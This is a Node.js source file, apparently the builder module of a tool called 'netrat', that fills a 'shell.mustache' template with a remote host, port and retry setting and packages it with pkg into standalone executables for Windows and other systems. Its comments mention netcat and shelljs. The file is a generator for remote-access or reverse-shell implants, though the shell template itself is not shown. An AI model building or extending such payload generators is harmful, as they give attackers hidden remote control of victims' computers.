const debug = require('debug')('netrat')
const path = require('path')
const os = require('os')
const fs = require('fs')
const exec = require('pkg').exec
const Mustache = require('mustache')
const SEED_PATH = path.join(__dirname, 'seed', 'shell.mustache')
var OUT_NAME = 'netrat'

function builder (opts, destination) {
  // options: {os, rhost, rport, retry, architecture, nodeVersion}
  var stubPath = genStubFromTemplate(SEED_PATH, opts)

  OUT_NAME += (opts.os === 'win') ? '.exe' : ''
  var pkgArgs = ['--target', `node${opts.nodeVersion}-${opts.os}-${opts.architecture}`, '--output', path.join(destination, OUT_NAME)]
  startPkg(stubPath, pkgArgs)
}

function startPkg (stubPath, args) {
  var input = [stubPath].concat(args)
  exec(input).then(success).catch(fail)
}

function genStubFromTemplate (templatePath, opts) {
  var file = fs.readFileSync(templatePath).toString()
  var seed = Mustache.render(file, opts)
  var outPath = path.join(os.tmpdir(), 'netrat-shell.js')
  fs.writeFileSync(outPath, seed)
  // TODO: pkg requires the node_modules?
  // 1. then the seed should be a gzip file!
  // 2. or mantain separately the SEED from netrat (2 different package.json) and npm install his dependencies on post_install. (mainly, shelljs + netcat)

  // return path to the /{tmp}/netrat-shell.js
  return outPath
}

function success (out) {
  // TODO: output from the pkg exec.
  console.log(out)

}

function fail (err) {
  // TODO: err from pkg exec. (boxen red border..)
  console.log(err)

}

module.exports = builder
